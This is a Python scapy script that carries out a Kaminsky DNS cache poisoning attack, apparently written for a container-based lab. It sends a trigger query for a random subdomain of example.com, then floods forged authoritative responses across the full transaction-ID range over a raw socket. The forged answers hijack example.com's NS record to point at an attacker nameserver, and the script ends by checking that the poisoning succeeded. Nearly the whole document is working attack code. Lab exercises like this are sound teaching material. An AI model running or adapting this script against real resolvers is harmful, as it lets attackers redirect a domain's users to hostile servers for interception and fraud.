from scapy.all import *
import struct
import socket
import random
import string

# Target recursive resolver (local-dns) and authoritative server being spoofed.
# The attack is sent from the attacker container to the recursive resolver.
target_dns = "10.9.0.53"
auth_dns = "10.9.0.154"  # example-dns authoritative server
# local-dns is configured with query-source port 33333 in bind9 configuration.
target_port = 33333

# 1. Generate a random subdomain to bypass any existing cache entry.
# Use random.choice for Python 3.4 compatibility in this old BIND lab container.
random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
domain = "{}.example.com".format(random_prefix)

print("[*] 1. Sending trigger query for {}...".format(domain))
# Trigger the resolver to ask for a new name.
trigger = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

print("[*] 2. Flooding spoofed KAMINSKY responses (Layer 2)...")
# Build the spoofed response packet.
# - IP(src=auth_dns): forge the source as the authoritative server.
# - UDP(sport=53): DNS server source port.
# - DNS(id=0): transaction ID is filled per-packet in the loop.
# - DNSRR(rrname=domain, type='A'): the fake answer record.
# - NS record points example.com at the attacker's nameserver.
# - Additional section gives the attacker's NS an A record.
base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(
        id=0,
        qr=1,
        aa=1,
        qd=DNSQR(qname=domain),
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
        ns=DNSRR(rrname="example.com", type='NS', ttl=86400, rdata="ns.attacker.com"),
        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata="10.9.0.10")
    )
)

# Convert the packet to raw bytes and open a raw socket on the attacker interface.
raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# 3. Flood with every possible transaction ID.
# Transaction ID offset is always 42 bytes inside this raw packet.
# (14 bytes Ethernet + 20 bytes IP + 8 bytes UDP = 42)
for txid in range(0, 65535):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

# 4. Verify whether the resolver now returns the poisoned record.
print("[*] 3. Verifying cache poisoning...")
verification = sr1(
    IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain)),
    timeout=3,
    verbose=0
)

if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
else:
    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))
